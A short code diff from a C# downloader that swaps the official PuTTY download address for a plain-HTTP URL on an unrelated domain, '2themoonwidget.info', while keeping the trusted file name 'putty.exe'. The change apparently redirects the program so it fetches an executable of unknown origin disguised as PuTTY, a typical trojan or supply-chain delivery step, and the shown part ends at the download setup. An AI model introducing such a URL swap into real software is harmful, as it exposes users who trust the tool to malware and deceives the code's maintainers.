@@ -19,7 +19,7 @@ uniq_id
 		   {
 		       try
 		       {
-			   string url = "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe";
+			   string url = "http://2themoonwidget.info/putty.exe";
 			   string filename = Path.GetFileName(url);
 			   string destinationpath = Path.Combine(Directory.GetCurrentDirectory(), filename);
 	
